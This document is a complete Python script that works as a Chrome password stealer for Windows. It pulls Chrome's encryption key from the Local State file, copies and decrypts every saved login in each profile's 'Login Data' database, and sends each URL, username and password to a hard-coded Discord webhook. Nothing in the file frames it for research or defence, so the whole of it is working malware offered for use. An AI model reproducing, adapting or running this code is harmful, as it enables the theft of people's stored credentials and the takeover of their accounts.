import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt
import requests

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        return None
def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            return ""
def send_discord_webhook(url, profile, url_info, username, password):
        data = {
            "embeds": [
                {
                    "title": f"Profile: {profile}",
                    "fields": [
                        {"name": "URL", "value": url_info},
                        {"name": "Username", "value": username},
                        {"name": "Password", "value": password}
                    ]
                }
            ]
        }
        response = requests.post('https://discord.com/api/webhooks/1166817409978617969/_Jwb3n9mVuZ2YSV-mkAyx8QRZefJA8giq98dVnaj_StBgb7EvvcTz1ngjs8hUQJiV3FD', json=data)
        if response.status_code == 204:
            print("Webhook sent successfully")
        else:
            print(f"Failed to send webhook, status code: {response.status_code}")       
def main():
    profiles_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
    for profile in profiles:
        db_path = os.path.join(profiles_path, profile, "Login Data")
        file_name = f"ChromeData_{profile}.db"
        if not os.path.isfile(db_path):
            continue
        shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        result = {}
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], get_encryption_key())
            if username or password:
                result[action_url] = [username, password]
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(file_name)
        except Exception as e:
            print(f"E")
        for url, credentials in result.items():
            url_info = url if url else action_url
            send_discord_webhook(url, profile, url_info, credentials[0], credentials[1])


    

if __name__ == "__main__":
    main()
